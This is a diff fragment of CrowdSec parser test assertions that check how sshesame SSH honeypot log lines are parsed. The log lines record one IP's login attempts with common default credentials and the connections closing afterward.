+results["s00-raw"]["crowdsecurity/non-syslog"][48].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][48].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][49].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][49].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58836] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][49].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][49].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][49].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][50].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][50].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58852] authentication for user \"telnet\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][50].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][50].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][50].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][51].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][51].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58776] authentication for user \"guest\" with password \"guest\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][51].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][51].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][51].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][52].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][52].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:58776] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][52].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][52].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][52].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][53].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][53].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59134] authentication for user \"minecraft\" with password \"minecraft\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][53].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][53].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][53].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][54].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][54].Evt.Parsed["message"] == "2022/04/16 20:45:49 [64.31.47.254:59134] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][54].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][54].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][54].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][55].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][55].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:58852] authentication for user \"telnet\" with password \"telnet\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][55].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][55].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][55].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][56].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][56].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:58852] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][56].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][56].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][56].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][57].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][57].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59024] authentication for user \"admin\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][57].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][57].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][57].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][58].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][58].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59086] authentication for user \"admin\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][58].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][58].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][58].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][59].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][59].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59024] authentication for user \"admin\" with password \"admin123\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][59].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][59].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][59].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][60].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][60].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59024] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][60].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][60].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][60].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][61].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][61].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][61].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59086] authentication for user \"admin\" with password \"admin\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][61].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][61].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][62].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][62].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:59086] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][62].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][62].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][62].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][63].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][63].Evt.Parsed["message"] == "2022/04/16 20:45:50 [64.31.47.254:58734] authentication for user \"usuario\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][63].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][63].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][63].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][64].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][64].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][64].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58734] authentication for user \"usuario\" with password \"usuario\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][64].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][64].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][65].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][65].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58734] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][65].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][65].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][65].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][66].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][66].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58912] authentication for user \"1\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][66].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][66].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][66].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][67].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][67].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58912] authentication for user \"1\" with password \"1\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][67].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][67].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][67].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][68].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][68].Evt.Parsed["message"] == "2022/04/16 20:45:51 [64.31.47.254:58912] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][68].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][68].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][68].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][69].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][69].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59100] authentication for user \"root\" without credentials rejected"
+results["s00-raw"]["crowdsecurity/non-syslog"][69].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][69].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][69].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][70].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][70].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][70].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59100] authentication for user \"root\" with password \"root\" accepted"
+results["s00-raw"]["crowdsecurity/non-syslog"][70].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][70].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][71].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][71].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59100] connection with client version \"SSH-2.0-Go\" established"
+results["s00-raw"]["crowdsecurity/non-syslog"][71].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][71].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][71].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][72].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][72].Evt.Parsed["message"] == "2022/04/16 20:45:52 [64.31.47.254:59114] [channel 0] closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][72].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][72].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][72].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][73].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][73].Evt.Parsed["message"] == "WARNING 2022/04/16 20:47:26 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][73].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][73].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][73].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][74].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][74].Evt.Parsed["message"] == "WARNING 2022/04/16 20:48:04 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][74].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][74].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][74].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][75].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][75].Evt.Parsed["message"] == "WARNING 2022/04/16 20:52:26 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][75].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][75].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][75].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][76].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][76].Evt.Parsed["message"] == "WARNING 2022/04/16 20:53:04 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][76].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][76].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][76].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][77].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][77].Evt.Parsed["message"] == "WARNING 2022/04/16 20:57:27 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][77].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][77].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][77].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][78].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][78].Evt.Parsed["message"] == "WARNING 2022/04/16 20:58:05 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][78].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][78].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][78].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][79].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][79].Evt.Parsed["message"] == "WARNING 2022/04/16 21:02:27 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][79].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][79].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][79].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][80].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][80].Evt.Parsed["message"] == "WARNING 2022/04/16 21:03:05 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][80].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][80].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][80].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][81].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][81].Evt.Parsed["message"] == "2022/04/16 21:03:14 [64.31.47.254:58998] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][81].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][81].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][81].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][82].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][82].Evt.Parsed["message"] == "2022/04/16 21:03:15 [64.31.47.254:58704] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][82].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][82].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][82].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][83].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][83].Evt.Parsed["message"] == "2022/04/16 21:03:15 [64.31.47.254:58862] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][83].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][83].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][83].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][84].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][84].Evt.Parsed["message"] == "2022/04/16 21:03:16 [64.31.47.254:59062] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][84].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][84].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][84].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][85].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][85].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][85].Evt.Parsed["message"] == "2022/04/16 21:03:16 [64.31.47.254:59086] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][85].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][85].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][86].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][86].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][86].Evt.Parsed["message"] == "2022/04/16 21:03:29 [64.31.47.254:58960] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][86].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][86].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][87].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][87].Evt.Parsed["message"] == "2022/04/16 21:03:29 [64.31.47.254:58932] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][87].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][87].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][87].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][88].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][88].Evt.Parsed["message"] == "2022/04/16 21:03:29 [64.31.47.254:58710] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][88].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][88].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][88].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][89].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][89].Evt.Parsed["message"] == "2022/04/16 21:03:30 [64.31.47.254:59228] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][89].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][89].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][89].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][90].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][90].Evt.Parsed["message"] == "2022/04/16 21:03:30 [64.31.47.254:58750] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][90].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][90].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][90].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][91].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][91].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][91].Evt.Parsed["message"] == "2022/04/16 21:03:30 [64.31.47.254:58852] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][91].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][91].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][92].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][92].Evt.Parsed["message"] == "2022/04/16 21:03:30 [64.31.47.254:58820] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][92].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][92].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][92].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][93].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][93].Evt.Parsed["message"] == "2022/04/16 21:03:30 [64.31.47.254:59134] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][93].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][93].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][93].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][94].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][94].Evt.Parsed["message"] == "2022/04/16 21:03:31 [64.31.47.254:58714] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][94].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][94].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][94].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][95].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][95].Evt.Parsed["message"] == "2022/04/16 21:03:31 [64.31.47.254:58738] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][95].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][95].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][95].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][96].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][96].Evt.Parsed["message"] == "2022/04/16 21:03:31 [64.31.47.254:58836] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][96].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][96].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][96].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][97].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][97].Evt.Parsed["message"] == "2022/04/16 21:03:31 [64.31.47.254:59078] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][97].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][97].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][97].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][98].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][98].Evt.Parsed["message"] == "2022/04/16 21:03:32 [64.31.47.254:58776] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][98].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][98].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][98].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][99].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][99].Evt.Parsed["message"] == "2022/04/16 21:03:32 [64.31.47.254:59024] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][99].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][99].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][99].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][100].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][100].Evt.Parsed["message"] == "2022/04/16 21:03:32 [64.31.47.254:59114] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][100].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][100].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][100].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][101].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][101].Evt.Parsed["message"] == "2022/04/16 21:03:32 [64.31.47.254:58912] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][101].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][101].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][101].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][102].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][102].Evt.Parsed["message"] == "2022/04/16 21:03:33 [64.31.47.254:58734] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][102].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][102].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][102].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][103].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][103].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][103].Evt.Parsed["message"] == "2022/04/16 21:03:34 [64.31.47.254:59100] connection closed"
+results["s00-raw"]["crowdsecurity/non-syslog"][103].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][103].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][104].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][104].Evt.Parsed["message"] == "WARNING 2022/04/16 21:07:28 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][104].Evt.Parsed["program"] == "sshesame"
+results["s00-raw"]["crowdsecurity/non-syslog"][104].Evt.Meta["datasource_path"] == "sshesame.log"
+results["s00-raw"]["crowdsecurity/non-syslog"][104].Evt.Meta["datasource_type"] == "file"
+results["s00-raw"]["crowdsecurity/non-syslog"][105].Success == true
+results["s00-raw"]["crowdsecurity/non-syslog"][105].Evt.Parsed["message"] == "WARNING 2022/04/16 21:08:06 Failed to establish SSH connection: EOF"
+results["s00-raw"]["crowdsecurity/non-syslog"][105].Evt.Parsed["program"] == "sshesame"
